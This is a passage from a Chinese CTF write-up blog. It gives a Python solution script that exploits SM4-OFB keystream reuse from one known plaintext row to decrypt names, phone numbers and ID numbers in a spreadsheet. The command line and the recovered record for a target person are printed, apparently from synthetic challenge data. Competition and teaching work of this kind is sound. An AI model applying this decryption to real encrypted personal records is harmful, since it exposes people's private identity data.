<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">decrypt_sm4_ofb_known_plaintext.py</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">说明：</span></span><br><span class="line"><span class="string">该脚本演示如何在 SM4-OFB（流模式）下，利用已知明文（known-plaintext）恢复 keystream 并解密表格中其它记录。</span></span><br><span class="line"><span class="string">脚本假定每个密文字段以 hex 字符串形式存储，IV 以 hex 存储（同一 IV 或同一密钥下的不同记录可能相同）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输出：</span></span><br><span class="line"><span class="string">- 在终端打印目标姓名对应的身份证号与 MD5</span></span><br><span class="line"><span class="string">- 保存一个解密后的 CSV（如果指定 --out）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注意：</span></span><br><span class="line"><span class="string">- 该方法**并不需要**知道 SM4 密钥或直接执行 SM4 算法；因为 OFB 模式下密文 = 明文 XOR keystream（流），知道任意明文-密文对可恢复对应位置的 keystream，进而解密其它使用相同 keystream 的密文。</span></span><br><span class="line"><span class="string">- 如果不同列或不同记录使用不同的 keystream（例如不同 IV 或不同密钥），则需要分别用对应的已知明文恢复每个 keystream。本脚本默认第一条记录（--known-row）为已知，并用该记录的姓名/手机号/身份证恢复 3 个 keystream，分别用于解密对应列的所有记录。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bytes</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="comment"># 允许传入 None 或 空字符串</span></span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    s = <span class="built_in">str</span>(s).strip()</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 去掉可能的前缀 0x</span></span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">&#x27;0x&#x27;</span>) <span class="keyword">or</span> s.startswith(<span class="string">&#x27;0X&#x27;</span>):</span><br><span class="line">        s = s[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_keystream_from_pair</span>(<span class="params">cipher_hex, plaintext, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span><br><span class="line">    c = hex_to_bytes(cipher_hex)</span><br><span class="line">    p = plaintext.encode(encoding)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p) &gt; <span class="built_in">len</span>(c):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;已知明文字节长度大于对应密文长度，无法直接派生密钥流&quot;</span>)</span><br><span class="line">    <span class="comment"># 明文在密文长度后补零（假设写入时明文按原始字节长度放入流的开头，后面用零填充）</span></span><br><span class="line">    p_padded = p + <span class="string">b&quot;\x00&quot;</span> * (<span class="built_in">len</span>(c) - <span class="built_in">len</span>(p))</span><br><span class="line">    ks = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(c, p_padded))</span><br><span class="line">    <span class="keyword">return</span> ks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_with_keystream</span>(<span class="params">cipher_hex, ks, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span><br><span class="line">    c = hex_to_bytes(cipher_hex)</span><br><span class="line">    <span class="comment"># 取最短长度的 keystream</span></span><br><span class="line">    n = <span class="built_in">min</span>(<span class="built_in">len</span>(c), <span class="built_in">len</span>(ks))</span><br><span class="line">    pt_bytes = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(c[:n], ks[:n]))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = pt_bytes.decode(encoding)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        s = pt_bytes.decode(encoding, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="comment"># 去掉可能的尾部填充和空白</span></span><br><span class="line">    s = s.rstrip(<span class="string">&#x27;\x00&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv=<span class="literal">None</span></span>):</span><br><span class="line">    p = argparse.ArgumentParser()</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--input&#x27;</span>, <span class="string">&#x27;-i&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;输入 Excel/CSV 文件路径（支持 xlsx/xls/csv）&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--known-row&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">0</span>, <span class="built_in">help</span>=<span class="string">&#x27;已知明文所在行（0-based 索引），默认 0&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--known-name&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;已知行的姓名明文&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--known-phone&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;已知行的手机号明文&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--known-id&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;已知行的身份证号明文&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--name-col&#x27;</span>, default=<span class="string">&#x27;姓名&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;姓名列名，默认 &quot;姓名&quot;&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--phone-col&#x27;</span>, default=<span class="string">&#x27;手机号&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;手机号列名，默认 &quot;手机号&quot;&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--id-col&#x27;</span>, default=<span class="string">&#x27;身份证号&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;身份证列名，默认 &quot;身份证号&quot;&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--iv-col&#x27;</span>, default=<span class="string">&#x27;IV&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;IV 列名，若无也可不动，默认 &quot;IV&quot;&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--target-name&#x27;</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&#x27;想要查询并输出 MD5 的目标姓名（例如 &quot;何浩璐&quot;）&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--out&#x27;</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&#x27;可选：解密后保存的 CSV 路径&#x27;</span>)</span><br><span class="line">    args = p.parse_args(argv)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取文件</span></span><br><span class="line">    <span class="keyword">if</span> args.<span class="built_in">input</span>.lower().endswith(<span class="string">&#x27;.csv&#x27;</span>):</span><br><span class="line">        df = pd.read_csv(args.<span class="built_in">input</span>, dtype=<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        df = pd.read_excel(args.<span class="built_in">input</span>, dtype=<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去掉全表空值的一些简单清理</span></span><br><span class="line">    df = df.fillna(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取已知行的三列密文</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c_name = df.at[args.known_row, args.name_col]</span><br><span class="line">        c_phone = df.at[args.known_row, args.phone_col]</span><br><span class="line">        c_id = df.at[args.known_row, args.id_col]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;无法在表中找到指定列或行：&#x27;</span>, e)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 派生三条 keystream（分别用于姓名/手机号/身份证列）</span></span><br><span class="line">    ks_name = derive_keystream_from_pair(c_name, args.known_name)</span><br><span class="line">    ks_phone = derive_keystream_from_pair(c_phone, args.known_phone)</span><br><span class="line">    ks_id = derive_keystream_from_pair(c_id, args.known_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对整列解密</span></span><br><span class="line">    dec_names = []</span><br><span class="line">    dec_phones = []</span><br><span class="line">    dec_ids = []</span><br><span class="line">    <span class="keyword">for</span> _, row <span class="keyword">in</span> df.iterrows():</span><br><span class="line">        dec_names.append(decrypt_with_keystream(row.get(args.name_col, <span class="string">&#x27;&#x27;</span>), ks_name))</span><br><span class="line">        dec_phones.append(decrypt_with_keystream(row.get(args.phone_col, <span class="string">&#x27;&#x27;</span>), ks_phone))</span><br><span class="line">        dec_ids.append(decrypt_with_keystream(row.get(args.id_col, <span class="string">&#x27;&#x27;</span>), ks_id))</span><br><span class="line"></span><br><span class="line">    df[<span class="string">&#x27;_dec_name&#x27;</span>] = dec_names</span><br><span class="line">    df[<span class="string">&#x27;_dec_phone&#x27;</span>] = dec_phones</span><br><span class="line">    df[<span class="string">&#x27;_dec_id&#x27;</span>] = dec_ids</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果指定目标姓名，查找并输出其身份证及 MD5</span></span><br><span class="line">    <span class="keyword">if</span> args.target_name:</span><br><span class="line">        hits = df[df[<span class="string">&#x27;_dec_name&#x27;</span>] == args.target_name]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(hits) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;未找到目标姓名: <span class="subst">&#123;args.target_name&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> idx, r <span class="keyword">in</span> hits.iterrows():</span><br><span class="line">                idval = r[<span class="string">&#x27;_dec_id&#x27;</span>]</span><br><span class="line">                md5 = hashlib.md5(idval.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;行索引:&#x27;</span>, idx)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;姓名:&#x27;</span>, r[<span class="string">&#x27;_dec_name&#x27;</span>])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;手机号:&#x27;</span>, r[<span class="string">&#x27;_dec_phone&#x27;</span>])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;身份证号:&#x27;</span>, idval)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;身份证 MD5:&#x27;</span>, md5)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 可选保存解密结果</span></span><br><span class="line">    <span class="keyword">if</span> args.out:</span><br><span class="line">        <span class="comment"># 保存部分列以免泄露原密文（但也可保存全部）</span></span><br><span class="line">        outdf = df.copy()</span><br><span class="line">        outdf.to_csv(args.out, index=<span class="literal">False</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;已保存解密后的表到:&#x27;</span>, args.out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 exp.py \</span><br><span class="line">--input 个人信息表.xlsx \</span><br><span class="line">--known-row 0 \</span><br><span class="line">--known-name <span class="string">&quot;蒋宏玲&quot;</span> \</span><br><span class="line">--known-phone 17145949399 \</span><br><span class="line">--known-id 220000197309078766 \</span><br><span class="line">--target-name <span class="string">&quot;何浩璐&quot;</span> \</span><br><span class="line">--out decrypted.csv</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">行索引: <span class="number">859</span></span><br><span class="line">姓名: 何浩璐</span><br><span class="line">手机号: <span class="number">14736125420</span></span><br><span class="line">身份证号: <span class="number">120000197404101676</span></span><br><span class="line">身份证 MD5: fbb80148b75e98b18d65be446f505fcc</span><br></pre></td></tr></table></figure>
<p>这个方向<code>ChatGPT-Pro</code>也能梭很多题，可惜牟钱啊</p>
<h1 id="else"><a href="#else" class="headerlink" title="else"></a>else</h1><p>没落的<code>Sloth</code>，没什么人打比赛了，今年圈圈都不在校队打了，小凳没一个报名的，就这样吧……</p>
<p>后面等大佬的<code>wp</code>出来，再学学<code>web</code>的思路……</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://hvang10.github.io">HvAng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://hvang10.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-WriteUp/">https://hvang10.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-WriteUp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/favicon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/10/07/Securinets-CTF2025-Misc-WriteUp/" title="Securinets CTF2025 Misc-WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">Securinets CTF2025 Misc-WriteUp</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">HvAng</div><div class="author-info__description">Just keep learning</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">54</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HvAng10"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is HvAng, a new star CTFer!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1-ez-unserialize"><span class="toc-number">1.1.</span> <span class="toc-text">web1 ez_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2-ezsignin"><span class="toc-number">1.2.</span> <span class="toc-text">web2 ezsignin*</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3-ez-blog"><span class="toc-number">1.3.</span> <span class="toc-text">web3 ez_blog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web4-auth-web"><span class="toc-number">1.4.</span> <span class="toc-text">web4 auth_web*</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web5-staticNodeService"><span class="toc-number">1.5.</span> <span class="toc-text">web5 staticNodeService</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web6-evil-login"><span class="toc-number">1.6.</span> <span class="toc-text">web6 evil_login*</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%AB%E7%AC%91%EF%BC%8C%E4%BD%A0%E8%AF%95%E4%BD%A0%E4%B9%9F%E8%BF%87%E4%B8%8D%E4%BA%86%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">2.1.</span> <span class="toc-text">别笑，你试你也过不了第二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc3-%E6%88%90%E5%8A%9F%E7%94%B7%E4%BA%BA%E8%83%8C%E5%90%8E%E7%9A%84%E5%A5%B3%E4%BA%BA"><span class="toc-number">2.2.</span> <span class="toc-text">misc3 成功男人背后的女人</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%91%9E%E5%BE%B7%E7%9A%84%E4%B8%80%E7%94%9F"><span class="toc-number">3.1.</span> <span class="toc-text">瑞德的一生</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ridiculous-LFSR"><span class="toc-number">3.2.</span> <span class="toc-text">Ridiculous LFSR*</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DS-amp-Ai"><span class="toc-number">4.</span> <span class="toc-text">DS&amp;Ai</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DS-amp-Ai1-SM4-OFB"><span class="toc-number">4.1.</span> <span class="toc-text">DS&amp;Ai1 SM4-OFB</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#else"><span class="toc-number">5.</span> <span class="toc-text">else</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-WriteUp/" title="羊城杯2025-WriteUp">羊城杯2025-WriteUp</a><time datetime="2025-10-12T16:00:00.000Z" title="Created 2025-10-13 00:00:00">2025-10-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/07/Securinets-CTF2025-Misc-WriteUp/" title="Securinets CTF2025 Misc-WriteUp">Securinets CTF2025 Misc-WriteUp</a><time datetime="2025-10-06T16:18:49.000Z" title="Created 2025-10-07 00:18:49">2025-10-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/01/CNSS-Recruit2025-Crypto-WriteUp/" title="CNSS-Recruit2025-Crypto-WriteUp">CNSS-Recruit2025-Crypto-WriteUp</a><time datetime="2025-10-01T14:53:10.000Z" title="Created 2025-10-01 22:53:10">2025-10-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/21/WMCTF2025-WriteUp/" title="WMCTF2025-WriteUp">WMCTF2025-WriteUp</a><time datetime="2025-09-20T16:18:08.000Z" title="Created 2025-09-21 00:18:08">2025-09-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/15/N1CTF-Junior-2025-2-2-WriteUp/" title="N1CTF Junior 2025 2/2 WriteUp">N1CTF Junior 2025 2/2 WriteUp</a><time datetime="2025-09-14T16:00:01.000Z" title="Created 2025-09-15 00:00:01">2025-09-15</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By HvAng</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>